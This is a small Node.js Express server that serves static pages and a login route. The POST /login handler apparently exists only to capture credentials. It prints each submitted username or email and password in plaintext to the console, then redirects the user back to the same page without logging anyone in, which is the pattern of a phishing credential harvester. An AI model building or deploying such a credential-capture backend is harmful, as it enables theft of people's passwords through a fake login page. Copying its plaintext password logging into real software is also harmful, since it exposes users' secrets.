const express = require('express');
const path = require('path');
const cookieParser = require('cookie-parser');

// server section
const app = express();
const PORT = 4001;

// Middleware to parse form data
app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(cookieParser());

// Setup to server static files
app.use(express.static('public'));
app.use(express.static('pages'));

app.get('/favicon.ico', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'favicon.ico'));
});

// Setup to serve HTML files
app.set('view engine', 'html');
app.engine('html', require('fs').readFile);

// Routes for iFrame pages
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'pages', 'index.html'));
});

// Handle login form submission
app.post('/login', (req, res) => {
    const { username_or_email, password } = req.body;

    console.log('=== Login Attempt ===');
    console.log('Username/Email:', username_or_email);
    console.log('Password:', password);
    console.log('Timestamp:', new Date().toISOString());
    console.log('====================\n');

    // Redirect back to login page
    res.redirect('/');
});

// 404 handler
app.use((req, res) => {
    res.status(404).sendFile(path.join(__dirname, 'pages', '404.html'));
});

// Start server
app.listen(PORT, () => {
    console.log(`Server is running on http://localhost:${PORT}`);
});
